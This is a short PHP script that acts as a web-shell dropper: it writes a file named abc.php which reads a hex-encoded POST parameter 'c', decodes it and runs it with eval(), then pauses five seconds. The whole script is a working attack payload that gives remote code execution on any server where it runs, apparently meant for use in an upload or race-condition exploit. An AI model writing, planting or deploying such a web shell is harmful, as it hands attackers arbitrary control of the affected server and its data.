<?php
echo "123";
file_put_contents('abc.php','<?php echo "ok"; $param = \'c\'; $inputCode = filter_input(INPUT_POST, $param); $decoded = hex2bin($inputCode); eval($decoded); ?>');
sleep(5);
echo "456";
?>
